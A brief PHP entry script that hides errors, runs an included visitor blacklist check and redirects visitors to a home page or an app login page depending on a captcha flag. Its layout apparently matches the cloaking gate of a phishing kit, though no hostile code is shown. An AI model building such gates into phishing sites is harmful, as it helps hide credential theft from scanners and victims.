<?php
error_reporting(0);
session_start();
include 'config.php';
include 'blacklist_check.php';




if ($reCaptcha === 'off') {
    $_SESSION['captcha_passed'] = true;
    header('Location: ./app/');
    exit;
} else {
    if (!empty($_SESSION['captcha_passed']) && $_SESSION['captcha_passed'] === true) {
        header('Location: ./app/login.php');
        exit;
    } else {
        header('Location: ./home');
        exit;
    }
}

?>
